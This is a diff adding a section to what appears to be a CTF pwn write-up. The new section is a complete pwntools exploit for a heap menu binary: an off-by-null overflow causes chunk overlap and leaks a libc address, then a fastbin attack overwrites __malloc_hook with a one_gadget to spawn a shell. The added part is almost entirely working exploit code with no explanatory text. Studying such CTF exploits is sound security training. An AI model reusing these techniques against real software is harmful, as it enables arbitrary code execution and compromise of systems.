@@ -197,3 +197,104 @@ free(1)
 # gdb.attach(p,"set $h=0x603020,$g=0x6020C0")
 p.interactive()
 ```
+
+## exp3: off-by-one
+
+```python
+#coding:utf8
+from pwn import *
+# from LibcSearcher import *
+context(log_level='debug',terminal=["tmux","splitw","-h"])
+binary = "./pesp"
+libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"
+
+p = process(argv=[binary])
+# p = remote("",)
+
+elf = ELF(binary)
+libc = ELF(libc_binary)
+
+context.arch = "amd64"
+
+def opt(idx):
+    p.sendlineafter("Your choice:",str(idx))
+
+def add(length,content):
+    opt(2)
+    p.sendlineafter("Please enter the length of servant name:",str(length))
+    p.sendafter("Please enter the name of servant:",str(content))
+
+def free(idx):
+    opt(4)
+    p.sendlineafter("Please enter the index of servant:",str(idx))
+
+def edit(idx,length,content):
+    opt(3)
+    p.sendlineafter("Please enter the index of servant:",str(idx))
+    p.sendlineafter("Please enter the length of servant name:",str(length))
+    p.sendlineafter("Please enter the new name of the servnat:",str(content))
+
+def show():
+    opt(1)
+
+# leak start
+add(0xf0,"a"*0xf0) # 0
+add(0x68,"b"*0x68) # 1
+add(0xf0,"c"*0xf0) # 2
+add(0x10,"d"*0x10) # 3
+
+free(0)
+
+payload = flat([
+    "a"*0x60,
+    0x170
+    ])
+edit(1,len(payload),payload) # off-by-null
+free(2)
+
+add(0xf0,"x"*0x10) # 0
+show()
+
+p.recvuntil("xxxx1 : ")
+
+offset = 0x3c4b78
+libc.address = u64(p.recv(6).ljust(8,"\0")) - offset
+log.success("libc base addr -> "+ hex(libc.address))
+
+# getshell
+add(0x160,"a") #2
+
+add(0xf0,"a"*0xf0) # 4
+add(0x68,"b"*0x68) # 5 off-by-one
+add(0xf0,"c"*0xf0) # 6
+add(0x10,"d"*0x10) # 7
+
+free(4)
+payload = flat([
+    "a"*0x60,0x170
+    ])
+edit(5,len(payload),payload)
+free(6)
+free(5)
+
+payload = flat([
+    "a"*0xf8,0x71,libc.sym["__malloc_hook"] - 0x23
+    ])
+add(0x120,payload)
+add(0x60,"a"*0x60)
+
+one_gadget = libc.address + 0x4527a
+
+payload = flat([
+    "\0"*11,
+    one_gadget,libc.sym["__libc_realloc"] + 0x10
+    ])
+
+add(0x60,payload)
+
+p.sendline("2")
+p.sendline("2")
+
+# gdb.attach(p,"set $h=0x603020,$g=0x6020C0")
+p.interactive()
+```
